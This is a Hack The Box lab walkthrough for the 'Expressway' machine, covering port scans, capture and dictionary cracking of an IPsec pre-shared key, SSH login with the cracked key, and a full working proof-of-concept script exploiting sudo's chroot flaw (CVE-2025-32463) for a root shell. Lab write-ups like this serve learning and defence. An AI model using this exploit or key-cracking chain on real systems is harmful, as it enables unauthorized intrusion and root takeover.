@@ -1,0 +1,263 @@
+---
+title: "Expressway"
+pubDate: "Jan 28 2026"
+description: "A walkthrough of the Expressway machine on Hack The Box."
+tags: ["htb", "walkthrough", "writeup", "expressway", "isakmp", "CVE--2025-32463"]
+author: "Koustubh Badshah"
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png?size=small&format=webp"
+---
+
+# Expressway
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+Expressway is an easy difficulty Linux machine on Hack The Box released in 20<sup>th</sup> September 2025, created by the user
+[dakkmaddy](https://app.hackthebox.com/users/17571). It focuses on isakmp service and exploiting a vulnerability in sudo for privilege escalation.
+
+### Enumeration
+
+As usual I started with nmap scan to enumerate open ports and services.
+
+```bash
+nmap -sC -sV -sS -O -A -p- -v <IP_ADDRESS>
+```
+
+The nmap scan results showed that the target machine has the following open ports and services:
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Uptime guess: 20.802 days (since Wed Jan  7 23:40:25 2026)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The ssh service is running OpenSSH 10.0p2 on Debian 8, hared for security. So no chance of exploiting it.
+
+I turned for UPD scan to check for any open UDP ports.
+
+```bash
+nmap -sU -v -p- <IP_ADDRESS>
+```
+
+The UDP scan results showed that the target machine has the following open UDP ports and services:
+```
+PORT      STATE         SERVICE
+9/udp     open|filtered discard
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+161/udp   open|filtered snmp
+500/udp   open          isakmp
+1029/udp  open|filtered solid-mux
+4500/udp  open|filtered nat-t-ike
+5060/udp  open|filtered sip
+49182/udp open|filtered unknown
+49190/udp open|filtered unknown
+```
+
+I found a open UDP port 500 running isakmp service. Running a ike-scan to enumerate more information about the isakmp service.
+
+### Exploitation 
+To enumerate the isakmp service running on UDP port 500, I used **[ike-scan](https://www.kali.org/tools/ike-scan/)** tool which is used to discover, fingerprint, and test IPsec VPN systems.
+
+```bash
+$ ike-scan -v <IP_ADDRESS>
+DEBUG: pkt len=336 bytes, bandwidth=56000 bps, int=52000 us
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52   Main Mode Handshake returned HDR=(CKY-R=622989831786582a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.490 seconds (2.04 hosts/sec).  1 returned handshake; 0 returned notify
+```
+The ike-scan results showed that the target machine is running isakmp service with Main Mode Handshake and supports XAUTH and Dead Peer Detection v1.0.
+
+Use **--help** option to see all the options of ike-scan.Then I used following steps to get PSK.
+
+```bash
+$ ike-scan -v -M --auth=PSK -A 10.129.238.52
+DEBUG: pkt len=356 bytes, bandwidth=56000 bps, int=54857 us
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52   Aggressive Mode Handshake returned
+        HDR=(CKY-R=bc542d4750718172)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.39 hosts/sec).  1 returned handshake; 0 returned notify
+
+$ ike-scan -v -M --auth=PSK -A 10.129.238.52
+DEBUG: pkt len=356 bytes, bandwidth=56000 bps, int=54857 us
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52   Aggressive Mode Handshake returned
+        HDR=(CKY-R=bc542d4750718172)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.39 hosts/sec).  1 returned handshake; 0 returned notify
+
+$ ike-scan -v -M --auth=PSK -A --id=ike@expressway.htb -P ike.psk 10.129.238.52
+DEBUG: pkt len=374 bytes, bandwidth=56000 bps, int=57428 us
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52   Aggressive Mode Handshake returned
+        HDR=(CKY-R=068f4f3175d71e53)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.120 seconds (8.36 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+I used -A flag for Aggressive mode handshake because MainMode was set and --auth=PSK to specify pre-shared key authentication method. The ID value is set to ike@expressway.htb as obtained from previous scan, -P used to specify the file containing list of possible PSKs (Pre-Shared Keys).
+Now I bruteforced the PSK using **psk-crack tool** which comes with ike-scan.
+
+```bash
+$ psk-crack -d <path-to-wordlist> ike.psk
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 0edac79a220ee2c997ce272dd7e9b37836cdab34
+Ending psk-crack: 8045040 iterations in 5.900 seconds (1363593.14 iterations/sec)
+```
+The psk-crack results showed that the pre-shared key (PSK) for the isakmp service is **freakingrockstarontheroad**.
+
+This PSK can be used to establish a SSH connection to the target machine, it will prompt for a password where i entered the PSK obtained from the previous step.
+```bash
+$ ssh ike@<ip-address>
+
+ike@expressway:~$ ls
+user.txt
+ike@expressway:~$ cat user.txt
+*********************************
+```
+
+I have captured the user flag successfully. Now moving towards privilege escalation to capture root flag.
+
+### Privilege Escalation
+
+To enumerate possible privilege escalation vectors, I used **[LinPEAS](https://www.kali.org/tools/peass-ng/)** script which is a popular post-exploitation enumeration tool for Linux systems.
+Transfer the linpeas.sh script to target machine using **python3 -m http.server** or any method you prefer scp, wget etc.
+
+```bash
+$ ./linpeas.sh
+```
+Till the linpeas.sh script was running I found a interesting finding in the output related to **sudo privileges**.
+```
+ike@expressway:~$ whoami
+ike
+ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+ike@expressway:~$ uname -a
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux
+ike@expressway:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+For security reasons, the password you type will not be visible.
+
+Password:
+Sorry, user ike may not run sudo on expressway.
+```
+
+The linpeas output showed that the sudo version is vulnerable to privilege escalation [CVE-2025-32463](https://www.exploit-db.com/exploits/52352),
+where an attacker can leverage sudo's -R (--chroot) option to runarbitrary commands as root, even if they are not listed in thesudoers file.
+Sudo versions 1.9.14 to 1.9.17 inclusive are affected.
+
+To exploit this I ran the following script to get root shell.
+
+```bash
+#!/bin/bash
+# sudo-chwoot.sh – PoC CVE-2025-32463
+set -e
+
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd "$STAGE"
+
+# 1. NSS library
+cat > woot1337.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void woot(void) {
+    setreuid(0,0);          /* change to UID 0 */
+    setregid(0,0);          /* change  to GID 0 */
+    chdir("/");             /* exit from chroot */
+    execl("/bin/bash","/bin/bash",NULL); /* root shell */
+}
+EOF
+
+# 2. Mini chroot with toxic nsswitch.conf
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc            # make getgrnam() not fail
+
+# 3. compile libnss_
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "[*] Running exploit…"
+sudo -R woot woot                 # (-R <dir> <cmd>)
+                                   # • the first “woot” is chroot
+                                   # • the second “woot” is and inexistent
+command
+                                   #   (only needs resolve the user)
+
+rm -rf "$STAGE"
+```
+
+To get root shell I executed the above script as follows:
+
+```bash
+$ nano exploit.sh
+# paste the script content and save it
+$ chmod +x exploit.sh
+$ ./exploit.sh
+[*] Running exploit…
+root@expressway:/# ls
+bin   etc         initrd.img.old  lost+found  opt   run   sys  var
+boot  home        lib             media       proc  sbin  tmp  vmlinuz
+dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
+root@expressway:/# cd root
+root@expressway:/root# ls
+root.txt
+root@expressway:/root# cat root.txt
+```
+
+I got root flag successfully.
